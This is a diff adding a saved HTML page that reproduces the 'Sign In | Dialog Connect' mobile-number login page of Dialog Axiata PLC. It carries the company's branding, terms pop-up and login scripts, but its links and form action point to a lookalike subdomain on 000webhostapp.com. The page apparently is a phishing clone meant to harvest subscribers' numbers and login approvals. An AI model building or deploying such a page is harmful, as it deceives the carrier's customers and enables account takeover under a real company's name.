@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<!-- saved from url=(0049)https://connect.dialog.000webhostapp.com/DialogConnect/UserLogin -->
+<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>Sign In | Dialog Connect</title>
+<link href="./Sign In _ Dialog Connect_files/dialog-styles.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./Sign In _ Dialog Connect_files/normalize.min.css">
+<link href="./Sign In _ Dialog Connect_files/jquery-ui.css" rel="stylesheet">
+<meta name="description" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<meta http-equiv="Expires" content="Sat, 01 Dec 2012 00:00:00 GMT">
+
+
+
+<meta name="google-signin-clientid" content="201167123468-1qeba7r7vngqmkqg28avn7ucujds1i3r.apps.googleusercontent.com">
+<meta name="google-signin-scope" content="https://www.googleapis.com/auth/plus.login">
+<meta name="google-signin-requestvisibleactions" content="http://schemas.google.com/AddActivity">
+<meta name="google-signin-cookiepolicy" content="single_host_origin">
+<meta name="google-signin-callback" content="signinCallback">
+
+<link rel="stylesheet" type="text/css" href="./Sign In _ Dialog Connect_files/loginStyle.css">
+<script type="text/javascript" async="" src="./Sign In _ Dialog Connect_files/analytics.js.download"></script><script type="text/javascript" async="" src="./Sign In _ Dialog Connect_files/dc.js.download"></script><script type="text/javascript" async="" src="./Sign In _ Dialog Connect_files/conversion_async.js.download"></script><script async="" src="./Sign In _ Dialog Connect_files/gtm.js.download"></script><script type="text/javascript" src="./Sign In _ Dialog Connect_files/formValidation.js.download"></script>
+<script src="./Sign In _ Dialog Connect_files/modernizr-2.6.2.min.js.download"></script>
+<link rel="stylesheet" href="./Sign In _ Dialog Connect_files/normalize.min.css">
+
+
+<script src="./Sign In _ Dialog Connect_files/jquery.min.js.download"></script>  
+<!--<script src="js/bootstrap.min.js"></script>
+<link rel="stylesheet" href="css/bootstrap.min.css" type="text/css" />  -->
+
+
+<!--[if (gt IE 8) | (IEMobile) | !IE]><!-->
+<link rel="shortcut icon" href="https://connect.dialog.000webhostapp.com/DialogConnect/images/icons/favicon.ico">
+
+<link href="./Sign In _ Dialog Connect_files/jquery-ui.css" rel="stylesheet">
+<link href="./Sign In _ Dialog Connect_files/jquery-ui(1).css" rel="stylesheet">
+
+<!--<![endif]-->
+<!--[if (lt IE 9) & (!IEMobile) & (gt IE 7)]>
+<link rel="stylesheet" href="css/ie.css">
+<![endif]-->
+
+<!--[if lte IE 7]>
+<link rel="stylesheet" href="css/ie7.css" media="screen, projection">
+ <![endif]-->
+
+<!--
+<script type="text/javascript" src="//use.typekit.net/sjk5qtd.js"></script>
+<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
+-->
+</head>
+<body>
+<!-- <body class="public" onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload=""> -->
+<!-- Google Tag Manager -->
+<noscript>&lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-BGDH" height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;</noscript>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-BGDH');</script>
+<!-- End Google Tag Manager -->
+
+<style type="text/css">
+
+#bgPopup2{
+display:none; 
+	position:fixed;  
+	_position:absolute; /* hack for internet explorer 6*/  
+	height:100%;  
+	width:100%;  
+	top:0;  
+	left:0;  
+	background:#000000;   
+	z-index:100001;  
+}  
+#Popup2{  
+	display:none; 
+	position:fixed;  
+	_position:absolute; /* hack for internet explorer 6 */    
+	z-index:100002;  
+	padding:12px;  
+	font-size:13px;  
+ /*padding: 10px 40px;  */ 
+    background: #dddddd;
+    border-radius: 10px;
+} 
+
+
+#myButton2{
+	/*button-like properties*/
+	display:block;
+	position:relative;
+	width:200px;
+	height:50px;
+	line-height:50px;
+	font-family:"Trebuchet MS";
+	font-size:14px;
+	text-align:center;
+	cursor:pointer;	
+	border:solid 1px grey;
+	margin:15px auto;
+}
+#content{
+	text-align:center;}
+</style>
+
+	<div class="col-sm-6" id="Popup2" style="position: absolute; top: 50.6667px; left: 297.5px;">
+		<div class="panel panel-warning">
+			<div class="panel-heading" align="center">
+				<h3 class="panel-title">Terms And Conditions</h3>
+			</div>
+			<div class="panel-body">
+				<p></p>
+				<ul class="bullets">
+					<li>Mobile Number Login service is provided to you by Dialog
+						Axiata PLC. We care about your privacy and we have kept it Sipmle.</li>
+					<li>You can login-in privately with Mobile Number Login and
+						we:
+						<ul>
+							<li>- Never share your phone number with anyone else.</li>
+							<li>- Never disclose your personal information unless you
+								choose to share and give your consent.</li>
+						</ul>
+					</li>
+					<li>Visit Dialog Mobile Number Login <a href="https://connect.dialog.000webhostapp.com/DialogConnect/terms-conditions.html" target="_blank">Privacy Policy</a> find
+						out how Mobile Number Login works and your choices.
+					</li>
+					<li>We do not want you to worry. <br> You can contact us
+						with any queries or concerns about
+					</li>
+
+				</ul>
+				<br>
+				<p>
+					<input name="" id="check_term" type="checkbox" value="" required="required" style="-webkit-appearance: checkbox;">
+					<strong>I Agree to Mobile Number Login Terms &amp;
+						Conditions and Privacy policy</strong>
+				</p>
+				<p></p>
+				<br>
+				
+	            <div class="FormSep">
+	            	<ul class="btn_or">            	            		            	
+	            		<li class="alignL MargL-410"><input id="agreebtn" type="submit" value="OK I get it. Sign me in" class="OrangeBut" disabled="disabled"></li>
+	            		<li class="alignR MargR-30"><input id="popupClose2" type="button" class="OrangeBut" value="Cancel"></li>            		
+	            	</ul>            
+				</div>
+
+			</div>
+		</div>
+	</div>
+	
+	
+			<form action="https://connect.dialog.000webhostapp.com/DialogConnect/login.jsp" method="post" id="redirectForm">
+               <input type="hidden" id="appId" name="appId" value="NeSelf">                                                                     
+			   <input type="hidden" id="mConnectRejected" name="mConnectRejected" value="yes">       
+            </form>
+
+	<div id="bgPopup2" style="height: 152px;"></div>
+	<div id="cont-top"></div>
+
+<div id="Mobile-Connect" align="center">
+	<header> <a href="http://www.dialog.000webhostapp.com/" title="Dialog Logo"><img src="./Sign In _ Dialog Connect_files/dialog-logo.png" width="158" height="97" alt="Dialog Logo" class="Dialog-Logo"></a> 
+     <h2>
+     	Having difficulty in remembering password..! <br><b>Use Mobile Connect</b> - No passwords required !
+	</h2>     
+	
+                    </header>
+  <div class="MobileCon2">
+      <h1 class="BorderB"><img src="./Sign In _ Dialog Connect_files/mobile-connect-logo.png" width="115" height="52" alt="connect" class="Center-Img"></h1>
+        <p>Authenticate via your Dialog Mobile Phone</p>
+		<form id="anonymousLogin">
+        	<div class="FormSep"><label for="userame">Enter your Mobile No. </label>
+            	<input name="" type="text" id="msisdn" class="Text">
+            	<p class="HelpTxt">(07xxxxxxxx)</p>
+                                            </div>
+                                        
+								                   <div class="input_wrapper" style="text-align: center;">
+								                       <p class="error_note" style="display: block;" id="errormsg" name="errMsg"><span id="errorMessage"></span></p>										   
+								                       	
+								                   </div>
+            
+            	<input id="anonymousBttn" value="Sign In" class="OrangeBut">
+            	<br>
+              
+                <a id="redirectSubmit">I don't have a Dialog mobile number</a>
+		         
+									           
+        </form>
+    
+    </div>     
+</div><!--Mobile Connect-->
+<footer><div id="Footer"><p class="alignL">Copyright 2017 Dialog Axiata PLC.</p><p class="alignR"><a href="https://connect.dialog.000webhostapp.com/DialogConnect/terms_and_conditions" target="_blank">Terms &amp; Conditions</a></p></div></footer>
+    <div class="system-message" style="display: none;">
+        
+    </div>
+    
+    <div class="msg" id="sysmsg" style="display: none;"><span>Please wait...</span></div>
+    
+	
+		
+	
+	
+	
+	<script src="./Sign In _ Dialog Connect_files/jquery.min.js(1).download"></script>
+    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.10.1.min.js"><\/script>')</script>
+	<script src="./Sign In _ Dialog Connect_files/jquery-ui.js.download"></script>
+    <script src="./Sign In _ Dialog Connect_files/retina-1.1.0.js.download"></script>
+    <script src="./Sign In _ Dialog Connect_files/enquire.min.js.download"></script>
+    <script src="./Sign In _ Dialog Connect_files/bootstrap.min.js.download"></script>
+    <script src="./Sign In _ Dialog Connect_files/main.js.download"></script>
+    <script src="./Sign In _ Dialog Connect_files/signin.js.download"></script>
+    <script type="text/javascript">
+
+    	$(function() {
+    		var retry = 0;
+    		var $body = $("body");
+    		var mconStatus = 0;
+    		var message = String('null');
+    		
+    		var anonymousLOA = 1;
+    		var appid = String('NeSelf');
+
+			  		  
+			  function centerPopup3() {
+				  
+   			var winw = $(window).width();
+   			var winh = $(window).height();
+   			var popw = $('#Popup3').width();
+   			var poph = $('#Popup3').height();
+   			$("#Popup3").css({
+   				"position" : "absolute",
+   				"top" : winh / 3,
+   				"left" : winw / 2 - popw / 2
+   			});
+   			//IE6
+   			$("#bgPopup3").css({
+   				"height" : winh
+   			});
+   		}
+			 
+			  $( "#redirectSubmit" ).click(function() {
+				  $( "#redirectForm" ).submit();
+				});
+
+   		function loadPopup3() {
+
+   			if ($("#bgPopup3").data("state") == 0) {
+   				$("#bgPopup3").css({
+   					"opacity" : "0.6"
+   				});
+   				$("#bgPopup3").fadeIn("slow");
+   				$("#Popup3").fadeIn("slow");
+   				$("#bgPopup3").data("state", 1);
+   				mconStatus = 1;
+   			}
+   		}
+
+   		$("#changeThings").click(function() {
+   			disablePopup3();
+   		});
+
+    		$( "#verification_div" ).dialog({ autoOpen: false,
+					modal: true,
+					draggable: false,
+					closeText: "hide",
+					show: { effect: "fadeIn", duration: 1000 },
+			    	resizable: false,
+			    	closeOnEscape: false,
+			    	   open: function(event, ui) { $(".ui-dialog-titlebar-close").hide(); }	,
+			    	   dialogClass: 'no-close success-dialog_2'
+					});
+
+    		$( "#loamsg" ).dialog({ autoOpen: false,
+				draggable: false,
+				closeText: "hide",
+				show: { effect: "fadeIn", duration: 1000 },
+		    	resizable: false,
+				dialogClass: 'no-close success-dialog_2'});
+    		
+  		  
+    		$('.system-message').hide();
+    		
+    		if(anonymousLOA === 1 || anonymousLOA ===2){
+    			$('.MobileCon').css("visibility","visible");
+    		}
+    		
+    		if(message!=='null'){
+    			$('.system-message').show();
+    		}
+    		
+    		$('body').on('click', function(){
+    			$('.system-message').hide();
+    		});
+    		
+    		var userIdCookie = readCookie('userid');
+    		
+    		if(userIdCookie!==null){
+    			$('#txtStaySignedIn').attr('checked','checked');
+    		}
+    		
+    		$('#txtStaySignedIn').click(function() {
+    		    if(!this.checked){
+    		    	del_cookie('userid');
+    		    }
+    		});
+
+
+    	 $('#msisdn').keypress(function(e){
+    	      if(e.keyCode==13)
+    	     $("#anonymousBttn").click();
+    	    	
+    	    });
+    	 $( "#anonymousBttn" ).click(function( event ) {
+            
+    			$("#errMsg").hide();
+    			var msisdn = $( "#msisdn").val();
+
+				var isValidMSISDN = false;
+
+				if(msisdn===""){
+					$("#errorMessage").html("Invalid mobile number");
+					$("#errormsg").show();
+					$("#errormsg").fadeOut(5000);
+				}
+				else{
+					isValidMSISDN = validateNumberField($( "#msisdn" ));
+				}
+
+				if(isValidMSISDN){
+					isValidMSISDN = isValidGSMA(msisdn);
+				}
+
+				if(isValidMSISDN && !$("#anonymousLogin").attr('createUSSD')) {
+					
+					ajaxCall({ msisdn: msisdn, appId: appid, term: 1}, "./rest/nipushRequest", function(data){						
+						if(data.isValid === "true"){
+							$( "#verification_div" ).dialog( "open" );
+							$('#sentMSISDN').html(msisdn);
+							var id = data.id;
+							var status = data.status;
+							$('#anonymousLogin').attr('createUSSD',true);
+							$('#anonymousLogin').attr('ussdId',id);
+
+							isApproved(id);
+						} else if(data.invalidLoa === "true"){
+
+							$( "#loamsg" ).dialog( "open" );
+						} else if(data.showTnC === "true"){
+
+							if(mconStatus===1)
+								{
+								disablePopup3();
+								}
+							$("#bgPopup2").data("state",0);
+							centerPopup();
+							loadPopup();
+						} else{
+							$("#msisdn").val("");
+						}
+					});
+				    //return false;
+				}
+            });
+  		
+
+    		function centerPopup() {
+    			var winw = $(window).width();
+    			var winh = $(window).height();
+    			var popw = $('#Popup2').width();
+    			var poph = $('#Popup2').height();
+    			$("#Popup2").css({
+    				"position" : "absolute",
+    				"top" : winh / 3,
+    				"left" : winw / 2 - popw / 2
+    			});
+    			//IE6
+    			$("#bgPopup2").css({
+    				"height" : winh
+    			});
+    		}
+
+    		function loadPopup() {
+    			if ($("#bgPopup2").data("state") == 0) {
+    				$("#bgPopup2").css({
+    					"opacity" : "0.5"
+    				});
+    				$("#bgPopup2").fadeIn("slow");
+    				$("#Popup2").fadeIn("slow");
+    				$("#bgPopup2").data("state", 1);
+    			}
+    		}
+
+    		$("#popupClose2").click(function() {
+    			disablePopup();
+    		});
+    		   	
+    		$("#agreebtn").click(function() {
+    			checkStatus();
+    		});
+    		function checkStatus() {
+    			if($('#check_term').is(':checked')) {
+    				 disablePopup();
+    				 var msisdn = $( "#msisdn" ).val();
+    				 retry=0;
+    				 ajaxCall({ msisdn: msisdn, appId: appid, term: 2}, "./rest/nipushRequest", function(data){
+ 						if(data.isValid === "true"){
+ 							$( "#verification_div" ).dialog( "open" );
+ 							var id = data.id;
+ 							var status = data.status;
+ 							console.log("Status .......... "+status);
+ 							
+ 							$('#anonymousLogin').attr('createUSSD',true);
+ 							$('#anonymousLogin').attr('ussdId',id);
+ 							
+ 							isApproved(id);
+ 						}
+ 					});
+
+    			} else {
+    				 alert("it's not checked"); 
+    			}	
+			}
+    		function isValidGSMA(msisdn){
+				var status = $.ajax({
+			    			 type: "POST",
+			    		        url : './rest/validateGSMA',
+			    		        async:false,
+			    		        data: {
+			    		        	msisdn: msisdn
+			    		        },
+			    		        success : function(data) {
+			        		        var returnValue= data.status;
+			    		        	return returnValue;
+			    		        }
+			    		    }).responseText;
+			    		 if(status=="{\"status\":\"1\"}"){
+								return true;
+							}
+							else{
+								invalidNumberErrorMsg();
+								return false;  
+							}
+			}
+   		
+    		function isApproved(ussdId){
+    			ajaxCall({id : ussdId, appId: appid, origPage: "login"}, "./rest/isApproved_Dialog", function(data){
+    				var status = data.status;
+    				var id = data.id;
+    				
+    				if(typeof data.channelUrl!='undefined'){
+						window.location.replace(data.channelUrl);
+						return true;
+					}
+    				
+    				if(status==="1"){
+        				$( "#verification_div" ).dialog( "close" );
+    					$body.removeClass("loading");
+    					$('#anonymousLogin').attr('approvedUSDD',true);
+    					$('#anonymousLogin').submit();
+    					$("#sysmsg").show();
+    					$("#sysmsg").fadeOut(3000);
+    				}
+    				else if(status==="0"){
+    					window.location.href = data.returnUrl;
+    				}else if(status === "3" && retry < 6){
+    					retry++;
+    					console.log("Status ............ "+status+" retry ........... "+retry);
+    					setTimeout(function() { isApproved(id); }, 4000);
+    				}else if(status === "3" && retry >= 6){
+    					$body.removeClass("loading");
+    					window.location.href = data.returnUrl;
+    				}
+    			});
+    		    return false;
+    		}
+    		
+    		function ajaxCall(data, url,callback){
+    			
+    			$.ajax({
+    				  type: "POST",
+    				  url: url,
+    				  data: data
+    				})
+    				.done(function( msg ) {
+    				    callback(msg);
+    				})
+    				.fail(function(err) {
+    			    	alert( "error : " +err);
+    			    	$body.removeClass("loading");
+    			  	});
+    		}
+			
+    	});
+
+    	
+    	
+    	
+    	function signinCallback(authResult) {
+    		  if (authResult['access_token']) {
+    		    document.getElementById('signinButton').setAttribute('style', 'display: none');
+
+    		  } else if (authResult['error']) {
+    			  alert('error');
+    		  }
+    		}
+    	
+    	function del_cookie(name)
+    	{
+    		document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+    	}
+    	
+    	function readCookie(name) {
+    		var nameEQ = name + "=";
+    		var ca = document.cookie.split(';');
+    		for(var i=0;i < ca.length;i++) {
+    			var c = ca[i];
+    			while (c.charAt(0)==' ') c = c.substring(1,c.length);
+    			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+    		}
+    		return null;
+    	}
+    	function validateNumberField(field) {
+		    var regex = /07[7|6][\d]{7}/g;
+		    
+		    var validNum = regex.test(field.val());
+		    
+		    if (!validNum) {
+		    	field.val("");
+				invalidNumberErrorMsg();
+		    }
+		    
+		    return validNum;
+		}
+		
+		function invalidNumberErrorMsg(){
+			$("#errorMessage").html("Invalid mobile number");
+			$("#errormsg").show();
+			$("#errormsg").fadeOut(5000);
+		}
+			   
+	   	$("#agreebtn").attr('disabled','disabled');
+
+	    $("#check_term").change(function() {
+    		if(this.checked) {
+    		     $("#agreebtn").removeAttr('disabled');
+    		} else {
+    		    $("#agreebtn").attr('disabled','disabled');
+    		}
+    	});
+    	
+		$(window).resize(function() {
+			centerPopup();
+		});
+		
+	    function loadPopup() {
+			if ($("#bgPopup2").data("state") == 0) {
+				$("#bgPopup2").css({
+					"opacity" : "0.8"
+				});
+				$("#bgPopup2").fadeIn("slow");
+				$("#Popup2").fadeIn("slow");
+				$("#bgPopup2").data("state", 1);
+			}
+		}
+
+		function disablePopup() {
+			if ($("#bgPopup2").data("state") == 1) {
+				$("#bgPopup2").fadeOut("slow");
+				$("#Popup2").fadeOut("slow");
+				$("#bgPopup2").data("state", 0);
+				$('#check_term').prop('checked', false);
+				$("#agreebtn").attr('disabled','disabled');
+			}	
+		}
+		
+		function disablePopup3() {
+			if ($("#bgPopup3").data("state") == 1) {
+				$("#bgPopup3").fadeOut("slow");
+				$("#Popup3").fadeOut("slow");
+				$("#bgPopup3").data("state", 0);
+				mconStatus = 0;
+			}	
+		}
+		
+		function centerPopup() {
+			var winw = $(window).width();
+			var winh = $(window).height();
+			var popw = $('#Popup2').width();
+			var poph = $('#Popup2').height();
+			$("#Popup2").css({
+				"position" : "absolute",
+				"top" : winh / 3,
+				"left" : winw / 2 - popw / 2
+			});
+
+			$("#bgPopup2").css({
+				"height" : winh
+			});
+		}
+	    
+    </script>
+
+<div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front no-close success-dialog_2" tabindex="-1" role="dialog" aria-describedby="verification_div" aria-labelledby="ui-id-1" style="display: none;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span><button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" role="button" aria-disabled="false" title="hide"><span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span><span class="ui-button-text">hide</span></button></div><div id="verification_div" class="TextC ui-dialog-content ui-widget-content">
+	<img src="./Sign In _ Dialog Connect_files/mobile-connect-logo.png" width="115" height="52" alt="connect" class="Center-Img">
+	    <h1 class="BorderB Large">Mobile Verification</h1>       
+	    <div class="TextC">
+	                <p>You logged in from<br>
+	                <span class="Large" id="sentMSISDN"></span></p>
+	                
+	                <p>Select <strong>"OK"</strong> on your Mobile Phone<br>
+	                 to complete login</p>          
+	            
+	                <p class="Small MargT-30">Please dial #124# <br>
+	                if you haven't received the verification prompt.</p>
+		</div>	             
+	</div></div><div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front no-close success-dialog_2" tabindex="-1" role="dialog" aria-describedby="loamsg" aria-labelledby="ui-id-2" style="display: none;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span id="ui-id-2" class="ui-dialog-title">Application Error</span><button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" role="button" aria-disabled="false" title="hide"><span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span><span class="ui-button-text">hide</span></button></div><div id="loamsg" class="ui-dialog-content ui-widget-content">
+		<p><span margin:0="" 7px="" 50px="" 0;"="">Sorry, an error has occurred. Please contact Call Centre for further assistance.</span></p>
+	</div></div></body></html>
